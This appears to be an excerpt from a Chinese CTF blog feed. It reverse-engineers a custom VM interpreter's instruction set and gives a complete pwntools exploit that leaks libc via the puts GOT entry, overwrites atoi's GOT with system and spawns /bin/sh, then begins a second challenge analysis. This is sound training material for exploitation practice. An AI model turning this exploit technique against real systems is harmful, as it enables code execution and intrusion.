operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">&amp;</span> <span class="token number">0xF0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">0x70</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">&amp;</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 0x73  push 先减后放</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 0xff-->opcode  3</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ptr<span class="token operator">-></span>stack_index <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>stack_index <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// buffer[1]  (第二个字节)</span>          ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 五个字节一个指令</span>        <span class="token punctuation">}</span></code></pre><p>可以看出来第一个字节为操作码，字节2为第第一个操作数。指令长度为5，但是接下来的else改变了这个假设</p><pre class=" language-c"><code class="language-c">       <span class="token keyword">else</span>                                    <span class="token comment" spellcheck="true">// 0x70</span>        <span class="token punctuation">{</span>          ptr<span class="token operator">-></span>esp_addr <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>esp_addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">buffer_i_addr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 作为ptr的索引buffer[1]    ptr[buffer[1]](ptr为4字节数组)</span>          ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>instruction <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>这次的指令长度为2，是变长指令   实现了从第二个操作数读数据，作为ptr的索引，放到栈上。</p><p>分析几条之后得到最终的结构体</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605619847052.png" alt="ptr结构"></p><p>指令需要分析关键指令</p><h2 id="指令整理"><a href="#指令整理" class="headerlink" title="指令整理"></a>指令整理</h2><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//寄存器数学运算</span><span class="token number">0x63</span>     reg_op1<span class="token operator">*</span><span class="token operator">=</span>op2（四字节） mul reg_op1 imm<span class="token number">0x43</span>     reg_op1<span class="token operator">+</span><span class="token operator">=</span><span class="token function">op2</span><span class="token punctuation">(</span>四字节<span class="token punctuation">)</span>    add reg_op1  imm     <span class="token comment" spellcheck="true">//可以给寄存器赋值（read）</span><span class="token comment" spellcheck="true">//输入到寄存器</span><span class="token number">0x03</span>        reg_op1<span class="token operator">=</span><span class="token punctuation">(</span>四字节<span class="token punctuation">)</span>op2       load reg_op1 imm    <span class="token comment" spellcheck="true">//很合适的read到寄存器</span><span class="token number">0x010</span>   get_reg3      load reg3  键盘<span class="token comment" spellcheck="true">//输出到显示器</span><span class="token number">0x0110</span>     put_reg3        put reg3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  输出到显示器<span class="token comment" spellcheck="true">//寄存器操作</span><span class="token number">0x01</span>     reg_op1<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span>四字节<span class="token punctuation">)</span>reg_op2<span class="token operator">+</span>op3        load reg_op1 <span class="token operator">*</span><span class="token punctuation">(</span>dword<span class="token punctuation">)</span><span class="token punctuation">(</span>reg_op2<span class="token operator">+</span>op3<span class="token punctuation">)</span>   把栈内的数据放到寄存器   <span class="token comment" spellcheck="true">//栈到寄存器</span><span class="token number">0x02</span>    <span class="token operator">*</span>（四字节）<span class="token punctuation">(</span>reg_op1<span class="token operator">+</span>op2<span class="token punctuation">)</span><span class="token operator">=</span>reg_op3   save  <span class="token operator">*</span><span class="token punctuation">(</span>dword<span class="token punctuation">)</span><span class="token punctuation">(</span>reg_op1<span class="token operator">+</span>op2<span class="token punctuation">)</span> reg_op3     <span class="token comment" spellcheck="true">//寄存器到栈（其他位置到栈，需要在寄存器里面有值）</span><span class="token number">0x70</span>  <span class="token operator">*</span><span class="token punctuation">(</span>esp<span class="token number">-4</span><span class="token punctuation">)</span><span class="token operator">=</span>reg_op1 指令长度为<span class="token number">2</span>   push reg_op1        push reg_op1        <span class="token comment" spellcheck="true">//寄存器到栈顶</span><span class="token number">0x73</span>    <span class="token operator">*</span><span class="token punctuation">(</span>esp<span class="token number">-4</span><span class="token punctuation">)</span><span class="token operator">=</span>op1（四字节）    push  <span class="token function">imm</span><span class="token punctuation">(</span>dword<span class="token punctuation">)</span>      指令长度<span class="token number">5</span>  <span class="token comment" spellcheck="true">//没有地址的检查把</span><span class="token comment" spellcheck="true">//寄存器之间复制</span><span class="token number">0x00</span>  reg_op1<span class="token operator">=</span>reg_op2    mov reg_op1 reg_op2 <span class="token comment" spellcheck="true">//寄存器复制</span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"x86_32"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    <span class="token comment" spellcheck="true">#/lib/i386-linux-gnu/libc.so.6</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x03        reg_op1=(四字节)op2       load reg_op1 imm    //很合适的read到寄存器</span><span class="token keyword">def</span> <span class="token function">read_reg</span><span class="token punctuation">(</span>op1<span class="token punctuation">,</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token string">"\x03"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>op2<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token comment" spellcheck="true">#0x00  reg_op1=reg_op2    mov reg_op1 reg_op2 //寄存器复制</span><span class="token keyword">def</span> <span class="token function">move_reg</span><span class="token punctuation">(</span>op1<span class="token punctuation">,</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token string">"\x00"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>op2<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token comment" spellcheck="true">#0x70  *(esp-4)=reg_op1 指令长度为2   push reg_op1        push reg_op1        //寄存器到栈顶</span><span class="token keyword">def</span> <span class="token function">Push_reg</span><span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token string">"\x70"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>op1<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token comment" spellcheck="true">#0x73    *(esp-4)=op1（四字节）    push  imm(dword)      指令长度5  //没有地址的检查</span><span class="token keyword">def</span> <span class="token function">Push_imm</span><span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token string">"\x73"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>op1<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">puts_reg3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x10\x01"</span><span class="token keyword">def</span> <span class="token function">restart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\xb0"</span><span class="token comment" spellcheck="true">#获取got表项   #leak_libc</span>payload<span class="token operator">=</span>read_reg<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>puts_reg3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>read_reg<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>puts_reg3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>read_reg<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>puts_reg3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>read_reg<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>puts_reg3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>restart<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>new<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug_1([0x08048A55,0x8048AC0])</span>play<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u32<span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># del1()</span><span class="token comment" spellcheck="true"># 获取劫持atoi函数got表</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"elf.got_free::::"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>read_reg<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"atoi"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg6=free_got</span>payload<span class="token operator">+=</span>read_reg<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"atoi"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg7=free_got</span>payload<span class="token operator">+=</span>Push_imm<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>restart<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>new<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug_1([0x08049039])</span>play<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>这种东西是一个具体值表示ptr的某一位的值的某一位的值。<br>第二行是ptr的某一位的值+3*(1)（这个值是个指针，1是因为char占一个字节）</p><pre class=" language-c"><code class="language-c"> ptr<span class="token operator">-></span>bufer_ptr<span class="token operator">-></span><span class="token function">field_3</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">+</span> <span class="token number">3</span></code></pre><p>结构体元素命名规则，是指针后面加addr或ptr</p><pre class=" language-c"><code class="language-c"><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>buffer_ptr</code></pre><p>关注点</p><ul><li>是指针还是实际的数，在命名上要有体现</li><li>取的数据是一个字节还是四个字节</li></ul><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span>v20<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token operator">-></span>buffer_ptr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> v19<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>关注指令</p><p>必须用到</p><ul><li>读入寄存器指令         用来设置寄存器</li></ul><p>获取libc</p><ul><li>如果程序能进行两次或两次以上输入可以输出到显示器  或者从一个地址加载数据到寄存器  指针读</li><li>寄存器复制指令         用来得到libc地址</li></ul><p>劫持执行流</p><ul><li>寄存器写到栈或内存     修改栈或内存基地址后用来实现任意地址写</li></ul>]]></content>
      
      
      <categories>
          
          <category> vmpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmpwn学习-2019CISCN-pwn-virtual</title>
      <link href="2020/11/11/vmpwn%E5%AD%A6%E4%B9%A0-2019CISCN-pwn-virtual/"/>
      <url>2020/11/11/vmpwn%E5%AD%A6%E4%B9%A0-2019CISCN-pwn-virtual/</url>
      
        <content type="html"><![CDATA[<h2 id="vmpwn解释器认识"><a href="#vmpwn解释器认识" class="headerlink" title="vmpwn解释器认识"></a>vmpwn解释器认识</h2><p>虚拟机定义的时候会定义一个全局变量的枚举类型,里面存放指令</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="总体结构"><a href="#总体结构" class="headerlink" title="总体结构"></a>总体结构</h3><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>exec_name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  section_info <span class="token operator">*</span>stack_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  section_info <span class="token operator">*</span>text_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  <span class="token function">do_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  exec_name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stack_addr <span class="token operator">=</span> <span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// stack段大小为64 malloc(64*8)</span>  text_addr <span class="token operator">=</span> <span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your program name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_read_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>exec_name<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 项目名字</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your instruction:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_read_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 指令</span>  <span class="token function">StoreOpcode</span><span class="token punctuation">(</span>text_addr<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 解析指令</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your stack data:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_read_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 存入栈数据</span>  <span class="token function">StroeStack</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 解析栈数据</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>text_addr<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 运行指令</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>exec_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts_stack</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your Program Crash :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// 回收空间</span>  <span class="token function">my_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>text_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_free</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605064989362.png" alt="虚拟机执行流程"></p><h3 id="创建段结构"><a href="#创建段结构" class="headerlink" title="创建段结构"></a>创建段结构</h3><p>创建一个包含段信息的结构,真正的段内容在结构指向的指针里,段的信息包含段指针,大小和一个表示数量的字段</p><pre class=" language-c"><code class="language-c">section_info <span class="token operator">*</span>__fastcall <span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>  section_info <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  section_info <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  ptr <span class="token operator">=</span> <span class="token punctuation">(</span>section_info <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 申请空间存放段的信息，每个段一个</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span 